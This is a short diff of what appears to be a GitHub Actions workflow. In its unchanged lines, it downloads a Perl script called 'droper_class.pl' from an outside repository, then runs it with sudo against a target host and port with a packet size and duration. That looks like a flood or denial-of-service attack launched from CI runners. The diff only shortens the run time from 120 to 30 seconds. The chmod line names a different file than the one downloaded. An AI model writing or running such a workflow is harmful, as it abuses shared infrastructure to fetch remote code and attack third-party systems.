@@ -32,10 +32,10 @@ jobs:
           wget https://github.com/AhmetKesser/Deneme/raw/refs/heads/main/droper_class.pl -O Perll.pl
           chmod +x Perl.pl || true
           
-          sudo timeout 120 perl Perll.pl "$TARGET" "$PORT" 1400 120
+          sudo timeout 30 perl Perll.pl "$TARGET" "$PORT" 1400 30
 
           
       - name: Finish !
         run: |
-          sleep 120
+          sleep 30
           exit 0
